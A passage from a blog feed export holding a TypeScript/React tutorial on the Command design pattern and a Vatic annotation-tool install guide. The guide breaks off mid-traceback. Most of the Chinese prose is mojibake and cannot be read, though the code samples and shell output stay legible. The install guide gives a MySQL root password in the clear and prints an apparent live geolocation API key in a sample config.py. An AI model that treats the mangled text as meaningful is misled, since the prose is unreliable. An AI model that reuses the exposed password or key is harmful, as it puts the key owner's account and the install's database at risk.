    <content><![CDATA[å‰è¨€é›–ç„¶ç›´åˆ°æœ€è¿‘æ‰å¯¦éš›åœ¨å·¥ä½œä¸Šä½¿ç”¨ TypeScript é€²è¡Œé–‹ç™¼ï¼Œä½†æ˜¯æ—©åœ¨å»å¹´å°±æœ‰æ–·æ–·çºŒçºŒåœ¨è‡ªå·±çš„ side project ä¸Šç©ç© TypeScriptï¼Œå‰›å¥½å¾Œä¾†å…¬å¸è®€æ›¸æœƒåœ¨ç ”è®€ç¶“å…¸çš„ Design Pattern æ›¸ç±ï¼Œå°±ç´¢æ€§ä½¿ç”¨ TypeScript ä¾†è£½ä½œç¯„ä¾‹ï¼Œæ„å¤–ç™¼ç¾ TypeScript åœ¨è¬›è§£ä¸€äº› Design Pattern çš„æ™‚å€™éå¸¸é©åˆï¼Œä¸åƒ…èƒ½å¤ æœ‰é¡åˆ¥ã€ç‰©ä»¶ç­‰æ¸…æ¥šçš„è¡¨ç¤ºï¼Œä¹Ÿèƒ½å¤ ç›´æ¥åœ¨ç¶²é ä¸Šåšå‡ºæœƒå‹•çš„ç¯„ä¾‹ã€‚
é›–ç„¶é€™æ˜¯è »ä¹…ä¹‹å‰è£½ä½œçš„ï¼Œä½†æœ€è¿‘æƒ³æƒ³é‚„æ˜¯å¯ä»¥åˆ†äº«ä¸€ä¸‹ï¼æ‰€ä»¥ä»Šå¤©å°±ä»¥ TypeScript ä¾†è£½ä½œç¯„ä¾‹ï¼Œç‚ºå¤§å®¶è¬›è§£ Command Patternï¼
Command Patternåœ¨ GoF Design Patternsï¼ˆä¹Ÿå°±æ˜¯ Design Patterns: Elements of Reusable Object-Oriented Software é€™æœ¬æ›¸ï¼‰ä¸­ Command Pattern å±¬æ–¼ Behavioural Patterns çš„ä¸€ç¨®ï¼Œä¸»è¦æ˜¯å®šç¾©é¡åˆ¥èˆ‡ç‰©ä»¶ä¹‹é–“çš„æºé€šèˆ‡äº’å‹•æ–¹æ³•ã€‚
Command Pattern çš„åˆè¡·ï¼Œæ˜¯å¸Œæœ›èƒ½å°‡å„ç¨®å°ç‰©ä»¶çš„æ“ä½œï¼ˆrequestï¼‰ä¹Ÿéƒ½ç¨ç«‹åŒ…è£æˆç‰©ä»¶ï¼Œå¦‚æ­¤ä¸€ä¾†ï¼Œé€™å€‹ requestï¼Œå°±èƒ½å¤ åœ¨å„å€‹ç‰©ä»¶å°è±¡ä¹‹é–“å‚³éï¼Œç”šè‡³æä¾› undoable çš„ operationã€‚
æˆ‘å€‘å¯ä»¥å¾ UML åœ–ä¾†ç†è§£ï¼š

By Sae1962 - Own work, CC BY-SA 4.0, Link

Command

å®šç¾©å‡ºä¸€å€‹ Command ä»‹é¢ï¼Œç”¨ä¾†åŸ·è¡Œæ“ä½œï¼Œè©²ä»‹é¢åªéœ€è¦å®šç¾©ä¸€å€‹ Execute() é€™å€‹æŠ½è±¡ methodã€‚


Concrete Command

å¾æŠ½è±¡çš„ Command ä»‹é¢æ‰€å¯¦ä½œçš„ Concrete Commandï¼Œæœƒå¯¦ä½œè©² Command å¯¦éš›ä¸Šè¦åŸ·è¡Œçš„å‹•ä½œå…§å®¹ï¼Œä¹Ÿå°±æ˜¯å¯¦ä½œ Execute()ï¼Œæ­¤å¤–ï¼Œä»–é‚„éœ€è¦è² è²¬å°‡ æ¥æ”¶æ“ä½œçš„ç‰©ä»¶ï¼ˆreceiverï¼‰ èˆ‡ å‹•ä½œï¼ˆActionï¼‰æœ¬èº«é€£çµèµ·ä¾†ã€‚ç°¡å–®ä¾†èªªï¼Œå°±æ˜¯ä»–æœƒè¢«å‚³éé€²ä¸€å€‹ç‰©ä»¶ï¼Œä¸¦ä¸”åœ¨ Execute() å‡½æ•¸ä¸­ï¼Œtrigger receiver åŸ·è¡Œç›¸å°çš„å‹•ä½œã€‚é€™é‚Šå€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒConcrete Command æœ¬èº«ä¸¦ä¸ç®¡ä¹Ÿä¸çŸ¥é“ receiver æœƒæ€éº¼å¯¦ä½œä»–å€‘çš„ actionï¼Œä»–åªéœ€è¦å‘Šè¨´ receiver ä»–æƒ³è¦å®Œæˆçš„æ˜¯ä»€éº¼å‘½ä»¤å³å¯ã€‚


Client

è² è²¬å‰µå»º Concrete Commandï¼Œä¸¦æŒ‡å®šå…¶ receiverã€‚


Invoker

å°±æ˜¯ä¸‹é”æŒ‡ä»¤çš„äººï¼Œè² è²¬å‘¼å« Commandã€‚


Receiver

çŸ¥é“æ¥å—åˆ° Command æ™‚ï¼Œè¦åŸ·è¡Œä»€éº¼å‹•ä½œï¼ˆActionï¼‰çš„äººã€‚



å…‰çœ‹ UMLï¼Œä¸€å®šé‚„ä¸å¤ªæ¸…æ¥šï¼Œæ¥è‘—æˆ‘å€‘å¾ sequence diagram ä¾†çœ‹çœ‹é€™å¹¾å€‹å°è±¡å½¼æ­¤ä¹‹é–“å¦‚ä½•äº’å‹•ï¼š

å¯ä»¥æƒ³åƒï¼ŒReceiver å°±æ˜¯é¤å»³æœå‹™ç”Ÿï¼Œè€Œ Client å°±æ˜¯é¡§å®¢ï¼Œé¡§å®¢æœƒçŸ¥é“è¦å°æœå‹™ç”Ÿä¸‹é”æŒ‡ä»¤ï¼Œæ‰€ä»¥æœƒç”¢ç”Ÿ new Command(Receiver)ï¼›ä½†ä»–å¯èƒ½éœ€è¦é€éæœå‹™éˆ´ï¼ˆInvoker)ï¼Œæ‰èƒ½è®“æœå‹™ç”ŸçœŸæ­£å»åŸ·è¡Œä»–çš„æŒ‡ä»¤ã€‚
æ¥è‘—æˆ‘å€‘å…ˆä¾†çœ‹çœ‹å¯¦éš›çš„ç¯„ä¾‹ã€‚
TypeScript å¯¦ä½œç¯„ä¾‹

ç•¶é¡§å®¢é»é¸ â€œGive me foodâ€ æŒ‰éˆ•æ™‚ï¼Œæœå‹™ç”Ÿå°±æœƒæ¥æ”¶åˆ°æŒ‡ä»¤ï¼Œä¸¦è¶•ç·Šå»æ‰¾å»šå¸«ï¼›è€Œç•¶é¡§å®¢æƒ³æ›´æ”¹é¤é»æ™‚ï¼Œå¯ä»¥é€é â€œHey get backâ€ï¼Œä¸‹é”æŒ‡ä»¤ä¾†å›å¾©æœå‹™ç”Ÿçš„ä¸Šä¸€å€‹å‹•ä½œã€‚
å¾ˆç°¡å–®æš´åŠ›çš„ç¯„ä¾‹å§XD
å¯¦éš›ä¸Šçš„ç¨‹å¼æ€éº¼å¯«å‘¢ï¼Ÿ
é¦–å…ˆæˆ‘å€‘å…ˆå¾å®šç¾© Command ä»‹é¢é–‹å§‹ï¼š
export class Command &#123;  public execute(): void &#123;    throw new Error(&quot;Abstract method!&quot;);  &#125;  public unexecute(): void &#123;    throw new Error(&quot;Abstract method!&quot;);  &#125;&#125;

å¦‚åŒå…ˆå‰ UML åœ–æ‰€æè¿°ï¼Œæˆ‘å€‘åªå®šç¾©æŠ½è±¡çš„ execute() methodï¼Œåœ¨ TypeScript ä¸­è¦æ¨¡æ“¬æŠ½è±¡æ–¹æ³•çš„æœ€ç°¡å–®åšæ³•å°±æ˜¯è®“ä»– throw Errorã€‚å¦å¤–æˆ‘å€‘åŒæ™‚ä¹Ÿå®šç¾©ä¸€å€‹ unexecute()ï¼Œä½œç‚ºå›å¾©çš„æ“ä½œã€‚


[2019&#x2F;04&#x2F;22 - Update]
æ„Ÿè¬ @pilagod çš„è£œå……ï¼ŒTypeScript æœ‰æä¾› Abstract é¡åˆ¥ï¼Œå¯ä»¥å¼·è¿«ç¹¼æ‰¿è€…å»å¯¦ä½œå…¶æŠ½è±¡å‡½æ•¸ï¼Œæ‰€ä»¥æˆ‘å€‘çš„ Command class å¯ä»¥å¯«æˆï¼š
export abstract class Command &#123;  abstract execute(): void;  abstract unexecute(): void;&#125;



import * as React from &quot;react&quot;;import &#123; Waiter &#125; from &quot;./Waiter&quot;;export class ConcreteOrderCommand extends Command &#123;  private receiver: React.RefObject&lt;Waiter&gt;;  private position: number;  constructor(receiver: React.RefObject&lt;Waiter&gt;) &#123;    super();    this.receiver = receiver;    this.position = 0;  &#125;  public execute(): void &#123;    console.log(&quot;`execute` method of ConcreteOrderCommand is being called!&quot;);    this.position = 300;    this.receiver.current.action(this.position);  &#125;  public unexecute(): void &#123;    console.log(&quot;`execut` method of ConcreteOrderCommand is being called!&quot;);    this.position = 0;    this.receiver.current.backAction(this.position);  &#125;&#125;

å†ä¾†å¯¦ä½œ ConcreteCommandï¼Œæˆ‘å€‘ extend æŠ½è±¡çš„ Command é¡åˆ¥ï¼ŒæŒ‡å®šå…©å€‹ç§æœ‰è®Šæ•¸ï¼šreceiver èˆ‡ positionã€‚
receiver å¯ä»¥å¾å…¶å®£å‘Šçš„é¡åˆ¥çœ‹å‡ºï¼Œå°±æ˜¯ Waiterï¼Œé€™å°±æ˜¯ TypeScript é©åˆèªªæ˜ Design Pattern çš„å„ªé»ä¹‹ä¸€ï¼Œå¯ä»¥å¾ˆæ˜ç¢ºçœ‹åˆ°é—œè¯æ€§ï¼Œæˆ‘å€‘å¾…æœƒæœƒçœ‹åˆ° Waiter çš„å¯¦ä½œã€‚è€Œ position å‰‡æ˜¯ç¯„ä¾‹ä¸­æˆ‘å€‘ç”¨åœ¨ execute() ä¸­ï¼Œå‘Šè¨´ receiver è©²å¦‚ä½• action çš„å·¥å…·ï¼Œåœ¨ç¯„ä¾‹ä¸­å°±æ˜¯æ”¹è®Š Waiter çš„ä½ç½®ã€‚
åœ¨ ConcreteCommand çš„ execute() å¯¦ä½œä¸­ï¼Œæˆ‘å€‘å®šç¾©å‡º â€œé€™å€‹ Commandâ€ è¦è®“ â€œå…¶å—æŒ‡å®šçš„ receiverâ€ é€²è¡Œæ€æ¨£çš„ â€œactionâ€ï¼Œä¹Ÿå°±æ˜¯é€™è¡Œï¼š
this.receiver.current.action(this.position);
æˆ‘å€‘å‘Šè¨´ receiver èªªï¼Œè«‹ä¾ç…§ this.position é€™å€‹åƒæ•¸å»åŸ·è¡Œä½ çš„ actionï¼Œä½†è¨˜ä½ï¼Œä½ çš„ action åˆ°åº•æ˜¯æ€éº¼å¯¦ä½œçš„æˆ‘ä¸¦ä¸ç®¡ä½ ã€‚
ï¼ˆé€™é‚Šè·Ÿ React ç›¸é—œçš„ä¸åšå¤ªå¤šè§£é‡‹ï¼ŒåŸºæœ¬ä¸Šå› ç‚ºæˆ‘å€‘éœ€è¦åœ¨ ConcreteCommand ä¸­å»å‘¼å« receiver çš„ action methodï¼Œæ‰€ä»¥æ¡ç”¨ React.RefObject&lt;T&gt; ä½œç‚º receiver çš„é¡å‹ï¼Œé€™æ¨£æˆ‘å€‘èƒ½é€é .current çš„ API å»å–å¾— React å¯¦é«”ã€‚ï¼‰
çœ‹åˆ°é€™é‚Šå¯ä»¥ç™¼ç¾ï¼Œç”±æ–¼æˆ‘å€‘ä¸¦ä¸éœ€è¦çŸ¥é“ receiver æœ¬èº«æ€éº¼å¯¦ä½œ actionï¼Œæ‰€ä»¥é—œæ³¨é»å¯ä»¥åˆ†é›¢ï¼Œåªè¦ç®¡å¥½è‡ªå·±é€™é‚Šå¦‚ä½•å‘¼å« receiver å³å¯ã€‚
åˆ°é€™é‚Šç‚ºæ­¢ï¼Œæˆ‘å€‘å·²ç¶“å¯¦ä½œå®Œ UML ä¸­çš„ Command ä»‹é¢èˆ‡ ConcreteCommand äº†ï¼Œæ¥è‘—è¼ªåˆ° Receiverï¼š
import * as React from &quot;react&quot;;const waiterStyle = &#123;  display: &quot;flex&quot;,  flexDirection: &quot;column&quot;,  alignItems: &quot;center&quot;,  transition: &quot;all 1s ease-in-out&quot;&#125;;type WaiterProps = &#123;  ref: React.RefObject&lt;Waiter&gt;;&#125;;type WaiterState = &#123;  position: number;&#125;;export class Waiter extends React.Component&lt;WaiterProps, WaiterState&gt; &#123;  constructor(props: any) &#123;    super(props);  &#125;  state = &#123;    position: 0  &#125;;  action = (position: number) =&gt; &#123;    console.log(&quot;command action!&quot;);    this.setState(&#123;      position    &#125;);  &#125;;  backAction = (position: number) =&gt; &#123;    console.log(&quot;command back action!&quot;);    this.setState(&#123;      position    &#125;);  &#125;;  render() &#123;    const &#123; position &#125; = this.state;    return (      &lt;div style=&#123;&#123; ...waiterStyle, transform: `translateX($&#123;position&#125;px)` &#125;&#125;&gt;        &lt;img          width=&quot;100px&quot;          src=&quot;https://image.flaticon.com/icons/svg/816/816577.svg&quot;        /&gt;      &lt;/div&gt;    );  &#125;&#125;

Receiver ä¹Ÿå¾ˆç°¡å–®ï¼Œé‡é»åœ¨æ–¼å¯¦ä½œ actionã€‚ä»¥ç¯„ä¾‹ä¾†èªªï¼Œæˆ‘å€‘æœƒå¾ ConcreteCommand æ¥æ”¶åˆ°æ–°çš„ position stateï¼Œæ‰€ä»¥æˆ‘å€‘è¦åŸ·è¡Œçš„å‹•ä½œå°±æ˜¯ this.setState(&#123; position &#125;)ï¼Œå°‡è‡ªèº«çš„ç‹€æ…‹æ”¹è®Šã€‚é€é TypeScriptï¼Œå¯ä»¥æ¸…æ¥šå®šç¾© state èˆ‡ props çš„å‹åˆ¥ã€‚
Waiter éœ€è¦æ¥æ”¶ä¸€å€‹ ref: React.RefObject&lt;Waiter&gt;; çš„ Propsï¼Œå‰‡æ˜¯èˆ‡ React å¯¦ä½œç›¸é—œï¼Œå› ç‚ºæˆ‘æ˜¯åˆ©ç”¨ const WaiterRef = React.createRef&lt;Waiter&gt;(); å°‡ Waiter çš„ ref å‚³éçµ¦ ConcreteCommandã€‚ï¼ˆå¯åƒè€ƒ Codesandbox å…§çš„å®Œæ•´ç¨‹å¼ç¢¼ï¼‰
æœ€å¾Œï¼Œæœ‰äº†æŒ‡ä»¤ï¼ˆConcreteCommandï¼‰ï¼Œæœ‰äº†æ¥æ”¶æŒ‡ä»¤çš„äººï¼ˆWaiterï¼‰ï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹ Customer è¦å¦‚ä½•ä½¿ç”¨æŒ‡ä»¤ä¾†å‘¼å« Waiter å§ï¼š
// æœ‰åˆªé™¤ä¸€äº›ä¸é‡è¦çš„ codeï¼Œi.e. style, etc.import * as React from &quot;react&quot;;import &#123; Waiter &#125; from &quot;./Waiter&quot;;import &#123; Command, ConcreteOrderCommand &#125; from &quot;./CommandPattern&quot;;type CustomerProps = &#123;  WaiterRef: React.RefObject&lt;Waiter&gt;;&#125;;type CustomerState = &#123;  orderCommand: Command;&#125;;export class Customer extends React.Component&lt;CustomerProps, CustomerState&gt; &#123;  constructor(props: any) &#123;    super(props);    const &#123; WaiterRef &#125; = props;    this.state = &#123;      orderCommand: new ConcreteOrderCommand(WaiterRef)    &#125;;  &#125;  render() &#123;    return (      &lt;div style=&#123;CustomerStyle&#125;&gt;        &lt;div          onMouseEnter=&#123;() =&gt; this.setState(&#123; btn1OnHover: true &#125;)&#125;          onMouseLeave=&#123;() =&gt; this.setState(&#123; btn1OnHover: false &#125;)&#125;          onClick=&#123;() =&gt; &#123;            this.state.orderCommand.execute();          &#125;&#125;        &gt;          Give me food!!        &lt;/div&gt;        &lt;div          onMouseEnter=&#123;() =&gt; this.setState(&#123; btn2OnHover: true &#125;)&#125;          onMouseLeave=&#123;() =&gt; this.setState(&#123; btn2OnHover: false &#125;)&#125;          onClick=&#123;() =&gt; &#123;            this.state.orderCommand.unexecute();          &#125;&#125;        &gt;          Hey get back!!        &lt;/div&gt;      &lt;/div&gt;    );  &#125;&#125;

åŸºæœ¬ä¸Š Customer å°±æ˜¯æœƒä¿æœ‰ ConcreteCommand åœ¨ state ç•¶ä¸­ï¼Œé€™æ¨£æ‰èƒ½åˆç†çš„ä¸æ–·ä¸‹é”æŒ‡ä»¤ã€‚
å¦å¤–ä¹Ÿéœ€è¦å–å¾— WaiterRef é€™å€‹ propsï¼Œæ‰èƒ½åœ¨åˆå§‹ ConcreteCommand æ™‚æŒ‡å®šå…¶ receiverã€‚
æ¥è‘—æˆ‘å€‘åªè¦åœ¨ä¸åŒåŠŸèƒ½çš„ button ä¸Šç¶å®š command å³å¯ï¼Œåˆ†åˆ¥å‘¼å« this.state.orderCommand.execute(); èˆ‡ this.state.orderCommand.unexecute();ã€‚
å¦‚æ­¤ä¸€ä¾†ï¼Œæˆ‘å€‘å°±æˆåŠŸç”¨ TypeScript å¯¦ä½œä¸€å€‹å®Œæ•´çš„ Command Pattern ç¯„ä¾‹å•¦ï¼ï¼ˆå®Œæ•´çš„ç¨‹å¼ç¢¼è«‹çœ‹ä¸Šæ–¹ CodeSandbox é€£çµï¼‰
Command Pattern çš„ Consequences
Command Pattern å°‡å‘¼å«æŒ‡ä»¤çš„ç‰©ä»¶èˆ‡åŸ·è¡ŒæŒ‡ä»¤çš„ç‰©ä»¶åˆ‡å‰²é–‹ä¾†ï¼Œé™ä½å½¼æ­¤ä¹‹é–“è€¦åˆåº¦ã€‚
Command æ˜¯ first-class objectsï¼Œå¯ä»¥è¢«å‚³éã€æ“ä½œèˆ‡ç¹¼æ‰¿ã€‚
å¯ä»¥ composite å¤šå€‹ Command åˆ°ä¸€å€‹ Command ä¸­ï¼Œé¡ä¼¼å·¨é›†æ¦‚å¿µã€‚
å¢åŠ  Command å¾ˆå®¹æ˜“ï¼Œå› ç‚ºä½ ä¸éœ€è¦æ›´æ”¹å…¶ä»–çš„ç¾æœ‰ Classã€‚

å¯¦ä½œ Command Pattern ä¸Šæ‰€éœ€è¦æ³¨æ„çš„ç´°ç¯€
éœ€è¦æ€è€ƒä¸€å€‹ Command è©²æ“æœ‰å¤šå°‘èƒ½åŠ›ï¼Œæ˜¯è¦å–®ç´”ä½œ receiver èˆ‡ action ä¹‹é–“çš„ bindingï¼Œå¤§éƒ¨åˆ†å¯¦ä½œæ“ºåœ¨ receiverï¼›æŠ‘æˆ–æ˜¯å°‡å¤§å¤šå¯¦ä½œè‡ªå·±è™•ç†æ‰ï¼Œreceiver åªæ˜¯ä¸€å€‹å‘½ä»¤çš„å—é«”ï¼Ÿ
æ˜¯å¦éœ€è¦æ”¯æ´ undo åŠŸèƒ½ï¼ŒCommand Pattern è¨­è¨ˆä¸Šå¤©ç”Ÿæ”¯æ´ undoï¼Œä½†å¯¦éš›å¯¦ä½œä¸Šä½ å¯èƒ½æœƒéœ€è¦é¡å¤–çš„å„²å­˜ state ä¾†é”æˆï¼Œæœƒå¢åŠ é–‹ç™¼è¤‡é›œåº¦ã€‚
è‹¥æ˜¯æ”¯æ´ undoï¼Œé‚„å¾—æ³¨æ„ç™¼ç”Ÿ error æ™‚ï¼Œæœƒä¸æœƒä¸æ–·ç´¯ç©ï¼Œé›£ä»¥ debugã€‚

çµè«–TypeScript ç¾åœ¨éå¸¸ç†±é–€ï¼ŒDesign Pattern å‰‡æ˜¯è¬å¹´ä¸æ•—ï¼Œå…©è€…æ­é…èµ·ä¾†ä¸€èµ·å­¸ç¿’å¯èªªæ˜¯å¤©ä½œä¹‹åˆï¼å°¤å…¶æ˜¯å¹³å¸¸å·¥ä½œæ²’æœ‰æ©Ÿæœƒç¢°è§¸åˆ°çš„è©±ï¼Œé€éé€™ç¨®æ–¹å¼å­¸ç¿’ä¸åƒ…å…©è€…çš†èƒ½å¸æ”¶ï¼Œé‚„èƒ½ç´¯ç©é»å°ç©å…·ã€‚
ä½†èªªèµ·ä¾†ï¼ŒTypeScript çš„çˆ­è­°ä¹Ÿä¸å°‘ï¼Œæœ€è¿‘åƒåŠ äº†å„ªç§€æ–°åŒäº‹å€‘ä¸»è¾¦çš„å¹¾å ´ Meetupï¼Œå†æ¬¡ç‡ƒèµ·æˆ‘å° Elm çš„èˆˆè¶£ï¼Œå¯æƒœå‰›åˆ°æ–°ç’°å¢ƒï¼Œç‘£äº‹å¤ªå¤šï¼Œé‚„ä¾†ä¸åŠæœ‰å€‹æˆæœåˆ†äº«ï¼Œä¸éä¹Ÿç®—æ˜¯æœ‰é»å¿ƒå¾—ï¼Œå¸Œæœ›ä¹‹å¾Œèƒ½å¤ åˆ†äº«ä¸€ä¸‹ã€‚
è³‡æ–™ä¾†æº
Wiki - Design_Patterns
TypeScript
TypeScript Design Pattern

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>react</tag>
        <tag>Design pattern</tag>
        <tag>Command</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Vatic å®‰è£æ•™å­¸</title>
    <url>/2019/03/16/vatic-setup-tutorial/</url>
    <content><![CDATA[å‰è¨€Vatic æ˜¯ç”¨ä¾†æ¨™è¨»å½±ç‰‡ä¸­ bounding box çš„å¥½ç”¨å·¥å…·ï¼Œå› ç‚ºå®ƒæä¾›äº† bounding box tracking çš„åŠŸèƒ½ï¼Œä¸éœ€è¦ä¸€å€‹ä¸€å€‹ frame å»é‡æ–°æ¨™è¨»ï¼Œæ‰€ä»¥æƒ³ç”¨ Machine Learning å­¸ç¿’å½±ç‰‡ä¸­ bounding box çš„äººä¾†èªªæ˜¯å¾ˆå¥½ç”¨çš„å·¥å…·ã€‚

å› ç‚º vatic çš„å®‰è£æ­¥é©Ÿæœ‰ä¸€é»è¤‡é›œï¼Œæ‰€ä»¥å¯«é€™ç¯‡æ•™å­¸æä¾›çµ¦éœ€è¦çš„è®€è€…æœ‹å‹ã€‚ç­†è€…è‡ªå·±æœ‰åœ¨ Ubuntu 16.04 è£æˆåŠŸï¼Œé€™ç¯‡æ•™å­¸ä¸»è¦æœƒ cover åˆ°å¦‚ä½•åœ¨è‡ªå·±é›»è…¦ä¸Š locally è·‘èµ·ä¾† vaticã€‚
é–‹å§‹å®‰è£é¦–å…ˆï¼Œå¤§å®¶å¯ä»¥å…ˆçœ‹çœ‹å®˜æ–¹ tutorialï¼Œè£¡é¢çš„æ­¥é©Ÿå°±æ˜¯æˆ‘å€‘è¦åšçš„ï¼Œåªæ˜¯å¦‚æœåªæŒ‰ç…§è£¡é¢çš„æ­¥é©Ÿåšï¼Œæœƒé‡åˆ°ä¸å°‘çš„ errorï¼Œæ‰€ä»¥æ¥ä¸‹ä¾†æˆ‘å€‘æœƒè£œå……ä¸€äº›ç›¸é—œçš„ç¶“é©—ã€‚
Downloadå®˜æ–¹ tutorial ä¸­æœƒå«å¤§å®¶ä¸‹è¼‰ install.sh æª”ï¼Œä½†æ˜¯ä»–å€‘æä¾›çš„ç¶²å€å·²ç¶“ç„¡æ³•é€£ä¸Šï¼Œé€™é‚Šå»ºè­°å¤§å®¶å¯ä»¥ä½¿ç”¨ æ­¤é€£çµ è£¡é¢çš„æª”æ¡ˆï¼Œæ˜¯ç†±å¿ƒçš„ç¶²å‹å¹«å¿™æ›´æ–°éçš„ installation scriptï¼Œè£èµ·ä¾†æ¯”è¼ƒæ²’æœ‰å•é¡Œã€‚
Apache server setupé€™é‚Šæä¾›å¤§å®¶ä¸€å€‹ä¿®æ”¹å®Œçš„ &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf ç¯„ä¾‹ï¼š
WSGIDaemonProcess www-dataWSGIProcessGroup www-data&lt;VirtualHost *:80&gt;ServerName localhostDocumentRoot /home/icaros/tool/vatic_home/vatic/publicWSGIScriptAlias /server /home/icaros/tool/vatic_home/vatic/server.pyCustomLog /var/log/apache2/access.log combined&lt;/VirtualHost&gt;

ç•¶ä½ æ”¹å®Œä¸Šé¢çš„æª”æ¡ˆï¼Œæƒ³è¦é‡æ–°å•Ÿå‹• apache æ™‚ï¼Œå¯èƒ½æœƒé‡åˆ°ä¸‹é¢çš„ error:
icaros@icaros-MS-7B61:/etc/apache2/sites-enabled$ sudo apache2ctl graceful[sudo] password for icaros:AH00558: apache2: Could not reliably determine the server&#x27;s fully qualified domain name, using 127.0.1.1. Set the &#x27;ServerName&#x27; directive globally to suppress this message

é€™æ™‚å€™å¯ä»¥åƒè€ƒé€™ç¯‡å›ç­” - Apache error â€œCould not reliably determine the serverâ€™s fully qualified domain nameâ€ï¼Œå°±å¯ä»¥ç¹¼çºŒé€²è¡Œã€‚
Database setupç•¶è¨­å®šå®Œ apache server å¾Œï¼Œä¸‹ä¸€æ­¥æˆ‘å€‘è¦ä¾†è¨­å®šå„²å­˜ annotation éœ€è¦ç”¨åˆ°çš„ database serverã€‚åªæ˜¯ï¼Œç•¶ä½ æŒ‰ç…§å®˜æ–¹æ•™å­¸çš„ç¬¬ä¸€æ­¥åšä¸‹å»ï¼Œä½ å°±æœƒç™¼ç¾é€™å€‹ errorï¼š
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic/public$ mysql -u rootERROR 1045 (28000): Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: NO)

ç•¶ä½ é‡åˆ°é€™å€‹æƒ…æ³ï¼Œåˆ¥æ“”å¿ƒï¼Œè«‹ä¸‹ mysql -u root -pï¼Œç„¶å¾Œå¯†ç¢¼è«‹è¼¸å…¥ hail_ukraineï¼Œå°±å¯ä»¥é€²å» mysql çš„å‘½ä»¤è¦–çª—äº†ï¼š
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic/public$ mysql -u root -pEnter password:Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 20Server version: 5.7.25-0ubuntu0.16.04.2 (Ubuntu)Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.mysql&gt;

ç„¶å¾Œå°±å¯ä»¥å»ºç«‹ vatic é€™å€‹ database ä¸¦é›¢é–‹ mysqlï¼š
mysql&gt; create database vatic;mysql&gt; quit

Setupæ¥ä¸‹ä¾†è¦è™•ç† config.pyï¼Œé€™é‚Šæä¾›å¤§å®¶ä¸€å€‹ç¯„ä¾‹ï¼š
signature = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot; # AWS secret access keyaccesskey = &quot;xxxxxxxxxxxxxxxxxxxx&quot; # AWS access key IDsandbox = True # if true, put on workersandbox.mturk.comlocalhost = &quot;http://localhost/&quot; # your local hostdatabase = &quot;mysql://root@localhost/vatic&quot; # server://user:pass@localhost/dbnamegeolocation = &quot;d4c08cbcd873067102638cd6f1bf3c5d63ff053a87a4148273159c3ed1493b04&quot; # api key for ipinfodb.commaxobjects = 25;# probably no need to mess below this lineimport multiprocessingprocesses = multiprocessing.cpu_count()import os.pathimport syssys.path.append(os.path.dirname(os.path.abspath(__file__)))

æ”¹å®Œä¸Šé¢çš„ç¯„ä¾‹ï¼ŒåŸ·è¡Œ turkic setup --databaseï¼Œå¾ˆå¯èƒ½æœƒé‡åˆ°ä¸‹ä¸€å€‹ errorï¼š
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic setup --databaseTraceback (most recent call last):File &quot;/usr/local/bin/turkic&quot;, line 4, in &lt;module&gt;__import__(&#x27;pkg_resources&#x27;).run_script(&#x27;turkic==0.2.5&#x27;, &#x27;turkic&#x27;)File &quot;/usr/local/lib/python2.7/dist-packages/pkg_resources/__init__.py&quot;, line 666, in run_scriptself.require(requires)[0].run_script(script_name, ns)File &quot;/usr/local/lib/python2.7/dist-packages/pkg_resources/__init__.py&quot;, line 1446, in run_scriptexec(code, namespace, namespace)File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/EGG-INFO/scripts/turkic&quot;, line 12, in &lt;module&gt;import cliFile &quot;/home/icaros/tool/vatic_home/vatic/cli.py&quot;, line 19, in &lt;module&gt;import qaFile &quot;/home/icaros/tool/vatic_home/vatic/qa.py&quot;, line 1, in &lt;module&gt;from match import matchFile &quot;/home/icaros/tool/vatic_home/vatic/match.py&quot;, line 1, in &lt;module&gt;import munkresFile &quot;/usr/local/lib/python2.7/dist-packages/munkres-1.1.2-py2.7.egg/munkres.py&quot;, line 79def pad_matrix(self, matrix: Matrix, pad_value: int=0) -&gt; Matrix:^SyntaxError: invalid syntax

æœƒé‡åˆ°é€™å€‹ error æ˜¯å› ç‚º munkres é€™å€‹ library åœ¨ 1.1.0 ç‰ˆä¹‹å¾Œå°±ä¸æ”¯æ´ Python 2 äº†ï¼Œä½† vatic ä¼¼ä¹éƒ½æ˜¯ç”¨ Python 2.7 å¯«çš„ï¼Œæ‰€ä»¥è«‹ç”¨ pip install munkres==1.0.12 å®‰è£è¼ƒèˆŠçš„ç‰ˆæœ¬ã€‚
å¥½äº†ï¼Œè™•ç†å®Œ munkres ä¹‹å¾Œï¼Œä½ åˆæœƒé‡åˆ°ä¸‹ä¸€å€‹ errorï¼š
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic setup --databaseTraceback (most recent call last):File &quot;/usr/local/bin/turkic&quot;, line 4, in &lt;module&gt;__import__(&#x27;pkg_resources&#x27;).run_script(&#x27;turkic==0.2.5&#x27;, &#x27;turkic&#x27;)File &quot;/usr/local/lib/python2.7/dist-packages/pkg_resources/__init__.py&quot;, line 666, in run_scriptself.require(requires)[0].run_script(script_name, ns)File &quot;/usr/local/lib/python2.7/dist-packages/pkg_resources/__init__.py&quot;, line 1446, in run_scriptexec(code, namespace, namespace)File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/EGG-INFO/scripts/turkic&quot;, line 16, in &lt;module&gt;turkic.cli.main()File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/turkic/cli.py&quot;, line 147, in mainhandler(args[1:])File 